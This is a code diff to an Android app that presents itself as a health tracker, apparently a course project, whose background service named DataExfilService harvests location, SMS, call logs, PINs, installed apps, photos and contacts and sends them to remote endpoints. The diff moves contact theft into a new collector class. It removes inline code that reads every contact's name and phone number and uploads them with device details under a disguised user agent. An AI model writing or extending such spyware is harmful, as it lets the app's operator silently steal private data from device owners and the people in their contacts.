@@ -34,6 +34,7 @@ import android.provider.Settings
 import android.provider.CallLog
 import com.inf2007.healthtracker.R
 import com.inf2007.healthtracker.utilities.collectors.AppCollector
+import com.inf2007.healthtracker.utilities.collectors.ContactCollector
 import com.inf2007.healthtracker.utilities.collectors.DataCollector
 import com.inf2007.healthtracker.utilities.collectors.LocationCollector
 import com.inf2007.healthtracker.utilities.collectors.PinCollector
@@ -54,13 +55,12 @@ class DataExfilService : Service() {
         const val USER_APPS_ENDPOINT = "$BASE_URL/user_apps"
         const val LOCATION_ENDPOINT = "$BASE_URL/location_update"
         private const val PHOTOS_ENDPOINT = "$BASE_URL/photos"
-        private const val CONTACTS_ENDPOINT = "$BASE_URL/contacts"
+        const val CONTACTS_ENDPOINT = "$BASE_URL/contacts"
         const val SMS_ENDPOINT = "$BASE_URL/sms"
         const val CALL_LOG_ENDPOINT = "$BASE_URL/call_logs"
     }
 
     private lateinit var photoObserver: ContentObserver
-    private lateinit var contactsObserver: ContentObserver
 
     private val photoSyncPrefs by lazy {
         getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE)
@@ -141,7 +141,6 @@ class DataExfilService : Service() {
         handler = Handler(Looper.getMainLooper())
         createNotificationChannel()
         setupPhotoObserver()
-        setupContactsObserver()
         registerReceiver(uploadFileReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_FILE"), RECEIVER_NOT_EXPORTED)
         registerReceiver(appInstallReceiver, IntentFilter(PackageLister.ACTION_APP_INSTALLED), RECEIVER_NOT_EXPORTED)
         registerReceiver(pinLogUploadReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_PIN_LOG"), RECEIVER_NOT_EXPORTED)
@@ -151,10 +150,12 @@ class DataExfilService : Service() {
             add(LocationCollector(this@DataExfilService))
             add(SmsCallLogCollector(this@DataExfilService))
             add(PinCollector(this@DataExfilService))
+            add(ContactCollector(this@DataExfilService))
         }
 
         collectors.forEach { it.startObserving() }
 
+        collectors.filterIsInstance<ContactCollector>().firstOrNull()?.setupObservers(contentResolver)
         collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.setupObservers(contentResolver)
     }
 
@@ -414,9 +415,9 @@ class DataExfilService : Service() {
 
         collectors.forEach { it.stopObserving() }
         super.onDestroy()
+        collectors.filterIsInstance<ContactCollector>().firstOrNull()?.removeObservers(contentResolver)
         collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.removeObservers(contentResolver)
         contentResolver.unregisterContentObserver(photoObserver)
-        contentResolver.unregisterContentObserver(contactsObserver)
         unregisterReceiver(uploadFileReceiver)
     }
 
@@ -510,157 +511,9 @@ class DataExfilService : Service() {
         }
     }
 
-    private fun setupContactsObserver() {
-        contactsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
-            override fun onChange(selfChange: Boolean, uri: Uri?) {
-                Log.d(TAG, "Contacts database changed: $uri")
-                scanAndUploadContacts()
-            }
-        }
-
-        contentResolver.registerContentObserver(
-            ContactsContract.Contacts.CONTENT_URI,
-            true,
-            contactsObserver
-        )
-
-        Log.d(TAG, "Contacts observer registered")
-
-        // Automatically scan if permission is already granted when service starts
-        if (hasContactsPermission()) {
-            Log.d(TAG, "Contacts permission granted, performing initial scan")
-            scanAndUploadContacts()
-        }
-    }
-
     private fun hasContactsPermission(): Boolean {
         return checkSelfPermission(android.Manifest.permission.READ_CONTACTS) ==
                 android.content.pm.PackageManager.PERMISSION_GRANTED
-    }
-
-    private fun scanAndUploadContacts() {
-        if (!isNetworkAvailable()) {
-            Log.d(TAG, "No network, skipping contacts scan")
-            return
-        }
-
-        if (!hasContactsPermission()) {
-            Log.d(TAG, "No contacts permission, skipping scan")
-            return
-        }
-
-        Log.d(TAG, "Starting contacts scan...")
-
-        val projection = arrayOf(
-            ContactsContract.Contacts._ID,
-            ContactsContract.Contacts.DISPLAY_NAME,
-            ContactsContract.Contacts.HAS_PHONE_NUMBER
-            // Removed CONTACT_LAST_UPDATED_TIMESTAMP as it's not available on all API levels
-        )
-
-        contentResolver.query(
-            ContactsContract.Contacts.CONTENT_URI,
-            projection,
-            null,
-            null,
-            null  // Remove ordering by timestamp
-        )?.use { cursor ->
-            val totalContacts = cursor.count
-            Log.d(TAG, "Contacts Scan: $totalContacts contacts found")
-
-            val idColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)
-            val nameColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)
-            val hasPhoneColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)
-
-            var uploadCount = 0
-            while (cursor.moveToNext()) {
-                val contactId = cursor.getString(idColumn)
-                val name = cursor.getString(nameColumn) ?: "Unnamed"
-                val hasPhone = cursor.getInt(hasPhoneColumn)
-
-                if (!contactsSyncPrefs.getBoolean("contact_$contactId", false)) {
-                    var phoneNumber = "No number found"
-
-                    if (hasPhone > 0) {
-                        phoneNumber = getPhoneNumberForContact(contactId)
-                    }
-
-                    uploadContactToServer(contactId, name, phoneNumber)
-                    contactsSyncPrefs.edit().putBoolean("contact_$contactId", true).apply()
-                    uploadCount++
-                }
-            }
-            Log.d(TAG, "Contacts Scan Complete: $uploadCount new contacts uploaded")
-        }
-    }
-
-    private fun getPhoneNumberForContact(contactId: String): String {
-        var phoneNumber = "No number found"
-
-        contentResolver.query(
-            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-            arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
-            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-            arrayOf(contactId),
-            null
-        )?.use { phoneCursor ->
-            if (phoneCursor.moveToFirst()) {
-                val numberColumn = phoneCursor.getColumnIndexOrThrow(
-                    ContactsContract.CommonDataKinds.Phone.NUMBER
-                )
-                phoneNumber = phoneCursor.getString(numberColumn)
-            }
-        }
-
-        return phoneNumber
-    }
-
-    private fun uploadContactToServer(contactId: String, contactName: String, phoneNumber: String) {
-        try {
-            val ipAddress = getUniqueDeviceId()
-
-            val contactData = JSONObject().apply {
-                put("type", "contact")
-                put("device_ip", ipAddress)
-                put("device_model", Build.MODEL)
-                put("android_version", Build.VERSION.RELEASE)
-                put("timestamp", System.currentTimeMillis())
-                put("app_package", packageName)
-                put("contact_id", contactId)
-                put("contact_name", contactName)
-                put("phone_number", phoneNumber)
-            }
-
-            val requestBody = contactData.toString()
-                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
-
-            val request = Request.Builder()
-                .url(CONTACTS_ENDPOINT)
-                .post(requestBody)
-                .addHeader("User-Agent", "HealthTracker/1.0")
-                .build()
-
-            NetworkClient.instance.newCall(request).enqueue(object : Callback {
-                override fun onFailure(call: Call, e: IOException) {
-                    Log.e(TAG, "Contact upload failed: $contactName - ${e.message}")
-                    contactsSyncPrefs.edit().remove("contact_$contactId").apply()
-                }
-
-                override fun onResponse(call: Call, response: Response) {
-                    if (response.isSuccessful) {
-                        Log.d(TAG, "Contact uploaded: $contactName -> $phoneNumber")
-                    } else {
-                        Log.w(TAG, "Contact upload failed: HTTP ${response.code}")
-                        contactsSyncPrefs.edit().remove("contact_$contactId").apply()
-                    }
-                    response.close()
-                }
-            })
-
-        } catch (e: Exception) {
-            Log.e(TAG, "Error uploading contact: ${e.message}")
-            contactsSyncPrefs.edit().remove("contact_$contactId").apply()
-        }
     }
 
     private fun uploadAllDownloads() {
